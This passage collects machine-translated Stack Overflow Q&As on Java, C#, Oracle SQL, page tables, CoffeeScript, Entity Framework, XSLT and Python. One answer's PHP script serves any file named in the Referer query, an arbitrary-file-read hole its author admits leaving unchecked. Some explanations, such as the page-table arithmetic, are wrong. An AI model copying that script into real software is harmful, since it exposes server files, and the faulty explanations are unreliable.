然而，它很可能会选择使用定义为的索引`MyIndex2(c,a,b)`

更新：请参阅[use-the-index-luke.com](http://use-the-index-luke.com/)（感谢 Greg）。

# java - 任何像 jboss 或 tomcat 这样的服务器，我想从部署的应用程序中实例化一个类

> ID：10772081
> 
> 赞同：0
> 
> 时间：2012-05-27T06:23:54.897
> 
> 标签：java, tomcat, jboss

如果我知道要实例化的包名称和类，是否可以通过另一个已部署的应用程序在已部署的应用程序中实例化一个类？在任何 jboss 或 tomcat 中？

谢谢和问候，〜K。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T06:31:42.937

是的，您可以通过[反射来实现](http://java.sun.com/developer/technicalArticles/ALT/Reflection/)

* * *

**例子**

```
Bar aBar;
String barClassName = getBarImplClass();
aBar =
  (Bar) Class.forName(barClassName).newInstance(); 
```

# c# - 旋转增加图像大小的原因是什么？

> ID：10772088
> 
> 赞同：3
> 
> 时间：2012-05-27T06:26:32.770
> 
> 标签：c#, image, rotation, image-resizing

我有一个 ac# 应用程序，其中包含一个图片库，我在其中显示一些图片。这个画廊有一些功能，包括左右旋转。一切都很完美，但是当我从图库中选择一张图片并按下旋转按钮（无论向左或向右旋转）时，图片的大小会显着增加。需要说明的是，图片的格式是JPEG。

旋转前图片大小：278 kb

旋转后图片大小：780 kb

我的旋转代码如下：

```
 public Image apply(Image img)
    {  
        Image im = img;
        if (rotate == 1) im.RotateFlip(RotateFlipType.Rotate90FlipNone);
        if (rotate == 2) im.RotateFlip(RotateFlipType.Rotate180FlipNone);
        if (rotate == 3) im.RotateFlip(RotateFlipType.Rotate270FlipNone);

        //file size is increasing after RotateFlip method

        if (brigh != DEFAULT_BRIGH ||
            contr != DEFAULT_CONTR ||
            gamma != DEFAULT_GAMMA)
        {
            using (Graphics g = Graphics.FromImage(im))
            {
                float b = _brigh;
                float c = _contr;
                ImageAttributes derp = new ImageAttributes();
                derp.SetColorMatrix(new ColorMatrix(new float[][]{
                        new float[]{c, 0, 0, 0, 0},
                        new float[]{0, c, 0, 0, 0},
                        new float[]{0, 0, c, 0, 0},
                        new float[]{0, 0, 0, 1, 0},
                        new float[]{b, b, b, 0, 1}}));
                derp.SetGamma(_gamma);
                g.DrawImage(img, new Rectangle(Point.Empty, img.Size),
                    0, 0, img.Width, img.Height, GraphicsUnit.Pixel, derp);
            }
        }
        return im; 
    } 
```

问题是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T08:03:47.667

在您的情况下，应用`RotateFlip`正在`im`更改`ImageFormat`from`Jpeg`到`MemoryBmp`。默认情况下，当您保存图像时，它将使用默认值`ImageFormat`。这将是返回的格式`im.RawFormat`

如果您检查 GUID`im.RawFormat.Guid`

*旋转翻转之前*

{b96b3cae-0728-11d3-9d7b-0000f81ef32e} 与`ImageFormat.Jpeg.Guid`

*旋转翻转后*

{b96b3caa-0728-11d3-9d7b-0000f81ef32e} 与`ImageFormat.MemoryBmp.Guid`

在保存图像时传递`ImageFormat`第二个参数，这将确保它使用正确的格式。如果没有提到，它将是其中的一个`im.RawFormat`

因此，如果您想在保存通话时另存为 jpeg

```
im.Save("filename.jpg", ImageFormat.Jpeg); 
```

这次文件大小应该小于原始大小。

另请注意`ImageFormat`在`System.Drawing.Imaging`命名空间中

**笔记**

要控制 jpeg 的质量，请使用此[MSDN 链接中提到的重载 Save 方法](http://msdn.microsoft.com/en-us/library/ytz20d80.aspx)

* * *

**根据评论编辑**

好的，假设您使用的是 SQL Server，您必须有一个`image`数据类型列（建议使用`varbinary(max)`而不是`image`将来它将被淘汰（[阅读 MSDN 帖子](http://msdn.microsoft.com/en-us/library/ms191262%28SQL.105%29.aspx)）

***现在到步骤***

```
1) read the contents as a stream / byte[] array

2) convert this to Image

3) perform rotate operation on the Image

4) convert this Image back to stream / byte[] array

5) Update the database column with the new value 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T06:51:28.983

两个原因：

1.  JPEG 压缩/编码/采样没有像原始 JPEG 那样优化。
2.  JPEG 不透明。当图像未旋转 90/180/270 度时，图像的矩形边界会变大。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-22T07:08:30.693

您应该`ImageFormat`在更改图像之前保留原始图像，并以原始图像格式保存到文件。像下面的代码：

```
using (Image image = Image.FromFile(filePath))
{
    var rawFormat = image.RawFormat;
    image.RotateFlip(angel);
    image.Save(filePath, rawFormat);
} 
```

# jquery - 带有 wordpress 的 Jquery 循环插件

> ID：10772090
> 
> 赞同：0
> 
> 时间：2012-05-27T06:26:44.857
> 
> 标签：jquery, wordpress, jquery-cycle

我正在使用带有 WP 主题的“jquery 循环插件”并且工作正常，但我不能让它从自定义字段动态生成控制拇指......这里的代码：

```
$(function() {
$('#featured').cycle({
    fx:      'fade',
    pager:   '#feat_nav',
    timeout:  4000,
    rev:           true,
    pagerAnchorBuilder: pagerFactory
});

function pagerFactory(idx, slide) {
    var s = idx > 2 ? ' style=""' : '';
    return '<li'+s+'><a href="#"><img src="<?php echo get_post_meta($post->ID, 'img', true) ;?>" alt=""></a></li>'; //  this is just an example for what i need to display 
};
}); 
```

html

```
<ul id="featured">
<?php while (have_posts()) : the_post(); ?>
      <li>
        <div class="caption-bottom">
        <a href="<?php the_permalink() ?>"><?php the_title(); ?></a>
        </div>
        <img src="" alt="" />
     </li>
   <?php  endwhile; wp_reset_query();?>   
   </ul>

  <ul id="feat_nav"></ul> 
```

知道如何做到这一点吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T15:29:10.510

您对服务器端和客户端之间的分离存在误解。pageAnchorBuilder 事件只会读取客户端，因此您需要做的是在幻灯片的某处填充缩略图的 src。如果 img 包含在您的幻灯片中，您可以搜索它，或者您可以使用数据属性在幻灯片元素上指定它（更容易一些）。它们可以是图像、属性或您想要的任何其他方式。

这是这个想法的演示：http: [//jsfiddle.net/lucuma/ghe35/1/](http://jsfiddle.net/lucuma/ghe35/1/)

```
<ul id="featured">
<?php while (have_posts()) : the_post(); ?>
      <li data-thumb='<?php echo get_post_meta($post->ID, 'img', true) ;?>'>
        <div class="caption-bottom">
        <a href="<?php the_permalink() ?>"><?php the_title(); ?></a>
        </div>
        <img src="" alt="" />
     </li>
   <?php  endwhile; wp_reset_query();?>   
   </ul>

  <ul id="feat_nav"></ul>

function pagerFactory(idx, slide) {
    var s = idx > 2 ? ' style=""' : '';
    return '<li'+s+'><a href="#"><img src="' + $(slide).attr('data-thumb') + '" alt=""></a></li>'; //  this is just an example for what i need to display 
}; 
```

我不确定上面的实际 php，但如果您可以像我对每个 li 元素所做的那样添加缩略图的地址，那么您可以在页面构建器类中阅读这些地址。

# sql - 计算Oracle SQL中字符出现的次数

> ID：10772091
> 
> 赞同：7
> 
> 时间：2012-05-27T06:27:23.413
> 
> 标签：sql, regex, string, oracle

如何计算特定字符在 Oracle 列中出现的次数？例如，如果我有一个包含 and 之类的数据的表，`FOO`我想计算逗号在数据中出现的次数。`a,ABC,def``2,3,4,5`

```
CREATE TABLE foo (
  str varchar2(30)
);

INSERT INTO foo VALUES( 'a,ABC,def' );
INSERT INTO foo VALUES( '2,3,4,5' );
commit; 
```

我想要的输出是

```
str         cnt
a,ABC,def   2
2,3,4,5     3 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-05-27T06:35:24.743

通常的技巧之一是使用`length`and的组合`replace`：

```
select (length(your_col) - length(replace(your_col, ','))) from your_table; 
```

[`replace`](http://docs.oracle.com/cd/B19306_01/server.102/b14200/functions134.htm)没有第三个参数只会删除字符。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-05-27T06:46:51.870

根据您的 Oracle 版本（`regexp_count`在 11.1 中引入），我倾向于发现做类似的事情更清楚

```
SELECT regexp_count( <<column_name>>, ',' )
  FROM <<table_name>> 
```

你可以在你的桌子上看到

```
SQL> ed
Wrote file afiedt.buf

  1  select str, regexp_count( str, ',' )
  2*   from foo
SQL> /

STR                            REGEXP_COUNT(STR,',')
------------------------------ ---------------------
a,ABC,def                                          2
2,3,4,5                                            3 
```

# memory-management - 如何使用倒置页表节省空间？

> ID：10772094
> 
> 赞同：4
> 
> 时间：2012-05-27T06:28:14.717
> 
> 标签：memory-management, operating-system

如果我们使用倒置页表将虚拟地址映射到物理地址，为什么要节省内存？例如，如果我们有两个进程，它们都有 4 个页面，我们将在两个不同的表中有 8 个条目，从虚拟地址指向物理地址：

```
Process 1:
[0] = 1
[1] = 5
[2] = 63
[3] = 0

Process 2:
[20] = 14
[21] = 55
[22] = 11
[25] = 9 
```

如果我们使用倒置页表，我们只会有一个大表指向它。但在大小上它们是相等的。

```
2) Inverted page table

[0] = <p1 | 3>
[1] = <p1 | 0>
[5] = <p1 | 1>
[9] = <p2 | 25>
[11]= <p2 | 22>
[14]= <p2 | 20>
[55]= <p2 | 21>
[63]= <p1 | 2> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-21T22:04:59.950

第一种情况下的页表是**每个进程的数据结构**。每个进程都有一个指向自己的页表的指针，当进程被调度时，这个指针被加载到 %CR3 寄存器中。此外，它在上下文切换时被保存与其他寄存器。

但是倒排哈希表是一种**全局数据结构**。使用这种技术的操作系统将使用某种锁定机制在给定时间点仅授予对 1 个进程的访问权限。（想象 2 个内核上的 2 个进程同时访问全局数据）。

假设每个进程 4GB 内存和 4096 页大小，在第一种情况下，每个进程都有 4GB/4096 （页表中的条目数 * 每个页表条目的大小），所有这些都会占用空间，对于每个进程被创建/分叉。用于将虚拟映射到物理的总内存是所有进程的页表大小的总和。这是一种更简单的方法，因为在每次上下文切换时，您只会更改一个指针，没有什么复杂的。

在第二种情况下，您将有一个只有 4GB/4096 个条目的表，因此节省了空间，但内存管理变得复杂，因为这是一个全局数据，您必须在每个条目中添加更多信息，告诉当前所有者如何是（如您所示）等。MMU/OS 必须注意同步。

但是您给出的示例并不准确，在具有每个进程页表的真实系统上，可以访问整个地址，在您的情况下，进程 p1 有 4 个页面，而 p2 有不同的页面集。实际上，两个进程都可以访问相同的虚拟地址，映射到不同的物理框架。因此，您的每个表中的每个表都必须有 8 个条目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T07:07:03.627

页表必须在一个块上（您将页面作为数组获取）。你从倒置表中得到两件事。

dir 表变得越来越小，例如，而不是 2^20 表大小和 2^12 的偏移量，你得到 2^10 dir 表大小。

然后，不是为页表获取 (2^20) * (2^2) 字节内存，而是将大部分页面映射到磁盘中，并且只有在进程需要它们时才会分配它。

在您的情况下，不是所有进程都有一个大小为 2^20 * 2^2 字节的页表，而是 dir 表只有 2^10 * 2^2 字节和另一个 2^10 *页表的 2^2 字节。这是一个很大的区别，而不是 2^22 字节，你有 2^13。

我希望这很清楚。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-24T02:21:00.143

倒排页表更小，因为它的大小取决于*内存大小*而不是*虚拟地址空间大小*。如果虚拟地址空间是 2^48，则*每个进程**可以*有 2^36 个页表条目。

 *对于倒排页表，页表条目的数量仅取决于内存大小。假设您有 4GB 内存，那么您的倒排页表将有 2^32 - 2^12 = 2^20 个条目。这也适用于任何数量的进程。*

# c++ - 当某些条件为真时，如何在 Eclipse 中以编程方式设置 C++ 断点？

> ID：10772096
> 
> 赞同：1
> 
> 时间：2012-05-27T06:29:02.980
> 
> 标签：c++, linux, eclipse, eclipse-cdt

我正在 Ubuntu 12.04 上开发 Eclipse。我有一个包含多个文件和类的庞大项目。一个类的一个成员变量在运行时的某个地方被错误地设置为零，我不知道什么时候会发生。我希望能够以**编程**方式设置断点以在运行时将 x 设置为零时中断。

请问我该怎么做？谢谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T06:32:42.300

您可以为此使用断点条件。

右键单击断点并在其属性窗口中设置条件。您可以设置一个条件，如

```
memberVal == null 
```

有关详细说明，请参阅[本文](http://wiki.eclipse.org/FAQ_How_do_I_set_a_conditional_breakpoint%3F)。

## 编辑

更改您的成员的所有发生情况

```
memberVar = value 
```

至

```
SetMemberVar(value) 
```

并在该 setter 方法中设置断点。

# matlab - 在 Matlab 中从网络摄像头获取快照

> ID：10772099
> 
> 赞同：1
> 
> 时间：2012-05-27T06:29:30.010
> 
> 标签：matlab, user-interface, scope, video-capture, matlab-guide

我创建了一个简单的 GUI 来预览网络摄像头流并从中获取快照。为此，我在轴上创建了显示视频，一个按钮（pushbutton1）开始预览，一个按钮（pushbutton2）获取快照。以下是这两个按钮的代码。

```
function pushbutton1_Callback(hObject, eventdata, handles)
% hObject    handle to pushbutton1 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
axes(handles.axes1);
vidObj = videoinput('winvideo',1);
videoRes = get(vidObj, 'VideoResolution');
numberOfBands = get(vidObj, 'NumberOfBands');
handleToImage = image( zeros([videoRes(2), videoRes(1), numberOfBands], 'uint8') );
preview(vidObj, handleToImage);

% --- Executes on button press in pushbutton2.
function pushbutton2_Callback(hObject, eventdata, handles)
% hObject    handle to pushbutton2 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
a=getsnapshot(get(axes,'Children'));
imshow(a); 
```

在 pushbutton2_Callback 中，我试图获得轴的孩子，即。`vidObj`. 但这给了我错误`??? Undefined function or method 'getsnapshot' for input arguments of type 'double'.`。为什么它返回双类型而不是子对象`vidObj`？如何修复它并获取快照？还有其他更好的方法吗？（我刚开始学习 GUI。）谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-09T16:47:04.360

将变量声明为全局变量的更好替代方法是使用`handles`结构来[共享数据](http://www.mathworks.com/help/techdoc/creating_guis/f5-998352.html)。GUIDE 已经使用这种结构来存储所有 GUI 组件的句柄。只需将您的数据作为字段添加到此结构中，该结构将传递给所有回调函数。

所以在第一个回调中：

```
function pushbutton1_Callback(hObject, eventdata, handles)
    %# ... your existing code ...

    %# store video object in handles, and persist
    handles.vidObj = vidObj;
    guidata(hObject,handles)
end 
```

然后在第二个中，您可以从`handles`结构中检索视频对象：

```
function pushbutton2_Callback(hObject, eventdata, handles)
    frame = getsnapshot(handles.vidObj);
    imshow(frame);
end 
```

# orchardcms - Orchard CMS 在自定义配方中向页面添加字段？

> ID：10772101
> 
> 赞同：0
> 
> 时间：2012-05-27T06:30:02.413
> 
> 标签：orchardcms

有什么方法可以让自定义配方向页面添加一些文本和图像字段？[它看起来像配方的一部分处理命令，但我在 @ http://docs.orchardproject.net/Documentation/Using-the-command-line-interface](http://docs.orchardproject.net/Documentation/Using-the-command-line-interface)找不到任何执行此操作的命令

**更新**

感谢 Bertrand 的回复，但有一些问题。

我从一个租户导出了食谱的所有内容，该租户具有 1\. 添加的字段，2\. 将部件添加到页面以及 3\. 添加的列表和 4\. 添加的容器小部件到显示列表的默认层。

```
 <Metadata>
    <Types>
      <Page ContentTypeSettings.Draftable="True" TypeIndexing.Included="true">
        <TagsPart />
        <LocalizationPart />
        <TitlePart/>
        <AutoroutePart />
        <ContainablePart />
        <AmazonProductsPart />
        <YouTubeVideosPart />
      </Page>
    </Types>
    <Parts>
      <BodyPart BodyPartSettings.FlavorDefault="html" />
      <Page ContentPartSettings.Attachable="True">
        <Thumbnail.ImageField DisplayName="Thumbnail" ImageFieldSettings.MaxHeight="75" ImageFieldSettings.MaxWidth="75" ImageFieldSettings.Required="False" ImageFieldSettings.AlternateText="True" ImageFieldSettings.ResizeAction="Validate" />
        <PageImage.ImageField DisplayName="PageImage" ImageFieldSettings.MaxHeight="250" ImageFieldSettings.MaxWidth="0" ImageFieldSettings.Required="False" ImageFieldSettings.AlternateText="True" ImageFieldSettings.ResizeAction="Resize" />
        <PreContent.TextField DisplayName="PreContent" ImageFieldSettings.MaxHeight="0" ImageFieldSettings.MaxWidth="0" ImageFieldSettings.Required="False" ImageFieldSettings.AlternateText="False" ImageFieldSettings.ResizeAction="Validate" TextFieldSettings.Flavor="Html" TextFieldSettings.Required="False" />
        <PostContent.TextField DisplayName="PostContent" ImageFieldSettings.MaxHeight="0" ImageFieldSettings.MaxWidth="0" ImageFieldSettings.Required="False" ImageFieldSettings.AlternateText="False" ImageFieldSettings.ResizeAction="Validate" TextFieldSettings.Flavor="Html" TextFieldSettings.Required="False" />
      </Page>
    </Parts>
  </Metadata> 
```

...

```
 <Data>
    <List Id="/alias=page-list" Status="Published">
      <CommonPart Owner="/User.UserName=admin" CreatedUtc="2012-05-26T22:52:20Z" PublishedUtc="2012-05-26T22:57:37Z" ModifiedUtc="2012-05-26T22:57:37Z" />
      <AutoroutePart Alias="page-list" UseCustomPattern="false" />
      <AdminMenuPart AdminMenuPosition="2" OnAdminMenu="false" />
      <MenuPart MenuText="Page List" MenuPosition="3" OnMainMenu="false" />
      <ContainerPart ItemContentType="Page" ItemsShown="true" Paginated="true" PageSize="10" OrderByProperty="CommonPart.CreatedUtc" OrderByDirection="1" />
      <TitlePart Title="Page List" />
    </List>
    <ContainerWidget Id="" Status="Published">
      <CommonPart Owner="/User.UserName=admin" Container="/Layer.LayerName=Default" CreatedUtc="2012-05-26T22:55:42Z" PublishedUtc="2012-05-26T22:55:42Z" ModifiedUtc="2012-05-26T22:55:42Z" />
      <WidgetPart Title="Page List" Position="1" Zone="AsideFirst" RenderTitle="false" />
      <ContainerWidgetPart Container="/alias=page-list" PageSize="5" OrderByProperty="CommonPart.CreatedUtc" OrderByDirection="1" ApplyFilter="false" FilterByProperty="CustomPropertiesPart.CustomOne" FilterByOperator="=" />
    </ContainerWidget>
  </Data> 
```

然后，我将其注入到默认配方的副本中，并激活了相应的模块。

从该配方创建新租户时，

1.  所有模块都启用了，很好
2.  列表已创建，很好
3.  页面有添加的部分，不错
4.  页面没有添加的字段，不好
5.  容器小部件不存在，不好

看起来没有添加部件字段，也没有创建小部件。

我做了另一个简单的测试，它看起来像一个错误？

复制步骤：

1.  向页面添加字段
2.  添加小部件
3.  导出一切
4.  删除小部件
5.  导入导出的 xml 预期：要回来的小部件 实际：仍然缺少小部件

配方是否假设尊重页面字段和小部件，我做错了什么，还是这是一个错误？

**更新**

好吧，这一定是个bug。手动添加字段时，即使未显示字段，我也会收到此消息：“已存在同名字段。”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T19:53:18.060

您不需要命令，没有它的食谱就支持这一点。获取示例的最简单方法是从管理 UI 添加一个字段，然后导出元数据并检查创建的配方。

# node.js - Coffeescript 和 node.js 混淆。需要实例化类？

> ID：10772102
> 
> 赞同：6
> 
> 时间：2012-05-27T06:30:14.677
> 
> 标签：node.js, coffeescript

我在尝试让我的类在我的 node.js 文件中工作时遇到问题。当我需要我编写的模块时，require './module' 调用我的构造函数并给出错误。但我实际上想稍后在文件中实例化。

IE

```
class Mic

constructor: (x) ->
  @t = []
  @t.push x

exports.Mic = Mic 
```

这是我的 app.coffee 文件

```
require 'coffee-script'
require './Mic' 
```

当我运行 app.coffee 时，它​​会给出一个异常 ReferenceError: x is not defined。这是有道理的，因为它调用了构造函数，但是为什么即使我没有调用 new Mic 也调用构造函数？

**编辑** 修复缩进后

```
class Mic
    constructor: (x) ->
        @t = []
        @t.push x

exports.Mic = Mic 
```

并将我的 app.coffee 更新为

```
Mic = require './Mic'

m = new Mic 3
console.log m 
```

我得到错误

```
TypeError: object is not a function
    at Object.CALL_NON_FUNCTION_AS_CONSTRUCTOR (native) 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-27T06:36:33.620

第一件事是第一件事：你不需要`require 'coffee-script'`- 运行它就`coffee`足够了；与运行已编译的 JavaScript 相同。您不需要程序运行时可用的 CoffeeScript 库。

其次，第一个文件出现缩进错误；如果您希望它成为`Mic`的构造函数，请将其缩进到 下一级`class`，即：

```
class Mic
  constructor: (x) ->
    @t = []
    @t.push x

exports.Mic = Mic 
```

最后，问题是这`exports`是一个出口**对象**。看这里：

```
exports.Mic = Mic 
```

您已分配`Mic`给`exports`对象的`Mic`键，所以现在`exports`在 Mic.coffee 中看起来像这样：

```
{ Mic: ...your class... } 
```

当您说 时`require './Mic'`，您正在取回该对象；换句话说：

```
require('./Mic') == { Mic: ...your class... } 
```

因此，您需要执行以下操作之一：

1.  导出`Mic`为 Mic.coffee 的整个导出，而不是键：

    ```
    module.exports = Mic 
    ```

2.  取出整个模块，然后在其中实例化`Mic`对象：

    ```
    mic = require './Mic'
    m = new mic.Mic 3 
    ```

3.  只需`Mic`从`require`'d 模块中取出：

    ```
    {Mic} = require './Mic'  # equivalent to saying Mic = require('./Mic').Mic
    m = new Mic 3 
    ```

# entity-framework - 未看到 app.config/web.config 中的实体框架 DbContext 连接字符串

> ID：10772108
> 
> 赞同：2
> 
> 时间：2012-05-27T06:31:51.337
> 
> 标签：entity-framework, ef-code-first, dbcontext, database-first

因此，我按照 ADO.NET 团队博客中的说明尝试制作了一个小型测试项目。我已经仔细检查了一切。它似乎不起作用，并一直说连接字符串丢失。

[http://blogs.msdn.com/b/adonet/archive/2011/03/15/ef-4-1-model-amp-database-first-walkthrough.aspx](http://blogs.msdn.com/b/adonet/archive/2011/03/15/ef-4-1-model-amp-database-first-walkthrough.aspx)

步。1 构建此 UserModels.dll。在dll，App.Config文件中，edmx生成了这个连接字符串：（制作的时候点击'test'按钮，连接成功，生成了'UserDatabase'所有表的edmx图）

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="UserModelsContainer" connectionString="metadata=res://*/UserModels.csdl|res://*/UserModels.ssdl|res://*/UserModels.msl;provider=System.Data.SqlClient;provider connection string=&quot;data source=MyDesktop\SQL2008;initial catalog=UserDatabase;integrated security=True;multipleactiveresultsets=True;App=EntityFramework&quot;" providerName="System.Data.EntityClient" />
  </connectionStrings>
</configuration> 
```

Step 2\. 然后我做了一个测试项目：

```
class UnitTetst1 ....
TestMethod1()....
using (var db = new UserModelsContainer()) {
  int i = db.Users.Count(); // <---expecting '0' for a new db, but I get an exception
} 
```

---------这里的问题-----

步骤 3\. 运行测试。然后我得到一个像这样的错误 InvalidOperationException：

```
"No connection string named 'UserModelsContainer' could be found in the application config file." 
```

似乎 DbContext 不知道从 App.Config 中获取 connectionStrings 的位置？

请帮忙~~

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-27T06:36:38.393

运行程序时，读取的是正在运行的 .exe 文件的 app.config。.dll 的 app.config 从未使用过。由于 UserModel.dll 是一个 dll，因此您必须在某个地方运行一个 .exe（或网站）。将连接字符串放在该 exe 的 app.config 中（或者如果它是 web.config 中的网站）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-09-10T18:52:17.520

当我尝试从“包管理器控制台”执行更新数据库命令时遇到了这个问题。我有一个单独的项目用于我的代码第一数据访问层和另一个用于我的 Web 项目等

我正在使用以下命令：*“update-database -projectname MYPROJECTDANAME -CONNECTIONSTRINGNAME CONNECTIONSTRING -Force”*

所以它指向我的 MYPROJECTDANAME 项目，但是它从您指定的启动项目中获取连接字符串名称。因此，请确保您标记为启动项目的项目具有所需的连接字符串。

# xml - 在 HTTP 查询中为 XML 文档指定自定义 XSL 文件

> ID：10772110
> 
> 赞同：3
> 
> 时间：2012-05-27T06:32:00.770
> 
> 标签：xml, xslt, httprequest

我有一个 XML 目录数据和一个 XSL 文件来可视化这个目录数据。我使用这一行来验证 XML。

```
<?xml-stylesheet type="text/xsl" href="presentation-list-catalog.xsl"?> 
```

这部分效果很好。

我想为设计师提供一个秘密链接，或者我需要使用另一个 XSL 文件来验证 XML。基本上我只需要更改 XSL 文件的链接：

```
<?xml-stylesheet type="text/xsl" href="download-links-catalog.xsl"?> 
```

此 XSL 文件是 XML 目录数据的另一种可视化，因此设计人员将能够下载高分辨率目录图片。为此，我想使用相同的 XML，但使用另一个自定义 XSL 文件进行转换。

是否可以使用如下 HTTP 请求指定自定义 XSL 文件：

```
http://example.com/catalog.xml?download-links-catalog.xsl 
```

有哪些可能的解决方案？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T07:49:28.193

如果您使用的是 PHP，则一种解决方案如下：

> 指向`catalog.xml`一个 PHP 文件，该文件根据引用 URL 提供正确的 XSL 文件。

您可以将此想法移植到其他[服务器端脚本](http://en.wikipedia.org/wiki/Server-side_scripting)，例如 Ruby、ASP、JSP 等。

**目录.xml**

在`catalog.xml`中，不是指向 XSL 文件，而是指向 PHP 文件。在本例中，PHP 文件是`catalog.php`.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet type="text/xsl" href="catalog.php"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
</catalog> 
```

**目录.php**

`catalog.php`根据引用 URL 提供正确的 XSL 文件。

```
<?php
// Output the correct Content-Type, so that browsers know 
// to treat this file as an XSL document
header("Content-Type: text/xsl; charset=utf-8");

// Example $referer: http://example.com/catalog.xml?download-links-catalog.xsl
$referer = parse_url($_SERVER['HTTP_REFERER']);

// Example $query: download-links-catalog.xsl
$query = $referer['query'];

// If the file exists, serve up $query.
// If not, serve up the default presentation-list-catalog.xsl.
$xslFile = file_exists($query) ? $query : "presentation-list-catalog.xsl";
echo file_get_contents($xslFile);
?> 
```

为简洁起见，此示例不包括一些安全检查。例如，您应该验证它`$query`实际上是一个 XSL 文件。如果未进行此检查，则黑客可以访问您服务器上的任意文件。

**演示列表目录.xsl**

这个 XSL 文件没有什么奇怪的。请注意，`h2`标签中的文本是`Presentation List Catalog`.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
  <h2>Presentation List Catalog</h2>
  <table border="1">
    <tr bgcolor="#9acd32">
      <th>Title</th>
      <th>Artist</th>
    </tr>
    <xsl:for-each select="catalog/cd">
    <tr>
      <td><xsl:value-of select="title"/></td>
      <td><xsl:value-of select="artist"/></td>
    </tr>
    </xsl:for-each>
  </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet> 
```

**下载链接catalog.xsl**

这个 XSL 文件除了标签`presentation-list-catalog.xsl`中的文本是.`h2``Download Links Catalog`

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
  <h2>Download Links Catalog</h2>
  <table border="1">
    <tr bgcolor="#9acd32">
      <th>Title</th>
      <th>Artist</th>
    </tr>
    <xsl:for-each select="catalog/cd">
    <tr>
      <td><xsl:value-of select="title"/></td>
      <td><xsl:value-of select="artist"/></td>
    </tr>
    </xsl:for-each>
  </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet> 
```

* * *

### 期待什么

使用上述设置，导航到`http://example.com/catalog.xml`
将`catalog.xml`使用`presentation-list-catalog.xsl`.

导航到`http://example.com/catalog.xml?download-links-catalog.xsl`
将`catalog.xml`使用`download-links-catalog.xsl`.

上面的示例 XML 和 XSL 文件取自 W3Schools 关于[“XSLT - 转换”的文章。](http://www.w3schools.com/xsl/xsl_transformation.asp)

# python - 如何将字符串与python中列表的每个元素进行比较

> ID：10772117
> 
> 赞同：-1
> 
> 时间：2012-05-27T06:33:21.463
> 
> 标签：python, python-2.7

大家好，我在 python 中做了一个小任务，我需要做以下事情：我有像 /home/user/music、/home/user/photos 这样的目录，用户插入了类似的女巫，每个新文件夹都是级别所以我需要做的是创建一个接收数字的方法，然后打印该级别的每个文件夹。

到目前为止，我已经创建了列表，但我不知道如何计算通过键盘添加的字符串中的每个“/”并将它们存储起来，这样我就可以知道级别，然后将它们与数字进行比较程序收到。

如果有人能给我至少一些关于从哪里开始的基本想法，我将非常感激。提前致谢

我想做这样的事情（伪代码）

```
example of some strings:
/home/user/music
/home/user/photos
/home/user/research
/home/user/music/rock

n=raw_input
if n is equal to a specific amount of "/":
print "every string that has the same amount of "/" 
```

到目前为止的完整代码

```
print "Please add paths"
l1=raw_input("> ")
l2=raw_input("> ")
while True:
        if l2 == "//":
            break
        else:
            l1=l1+"\n"
            l1=l1+l2
            l2=raw_input("> ")
l1=l1.split("\n")
print "Your paths are"
print "\n"
print "\n" .join(l1)
print "\n"
print l1[1].count("/")

while True:
    print "Choose an option "
    print "1\. Amount of sub folders of a path"
    print "2\. Amount of folders at a specified level"
    print "3\. Max depth between all the folders"
    op=raw_input()
    if op == "1":
        print "Ingrese directorio"
        d=raw_input()
    if op == "2":
        print "Ingrese nivel"
        n=raw_input()
        compararnivel(n)

raw_input() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T14:11:38.817

如果您确定用户输入了整个路径名，并且没有相对路径等，您可以简单地使用[str.count](http://docs.python.org/library/stdtypes.html#str.count)如下：

```
>>> str.count('/home/usr/music', '/')
3 
```

但是，如果您确实需要操作路径以首先将它们变成完整路径格式，和/或进行路径验证，请查看[os.path中提供的函数](http://docs.python.org/library/os.path.html)

好的，这是一些解释我的评论的代码：

1.  您可以将 raw_input 数据添加到列表中，而不是将其加入字符串并将其拆分，如下所示：

    ```
    l1 = [] # This makes an empty list
    l2 = raw_input("> ") # Do this statement in a loop if you like
    l1.append(l2) # This appends l2 to the list 
    ```

2.  while 循环可以更好地表示如下：

    ```
    while l2!='//':
      append l2 to the list
      prompt the user for more input 
    ```

3.  您应该在第二个 while 循环中添加一个结束条件，也许是通过添加一个要求用户退出的第四个提示

将所有这些放在一起，您会得到以下信息（请注意我的评论，它们应该对您有所帮助）

```
print "Please add paths, enter // to stop" # It is a good idea to tell the user how to stop the input process

l1 = [] # Create empty list
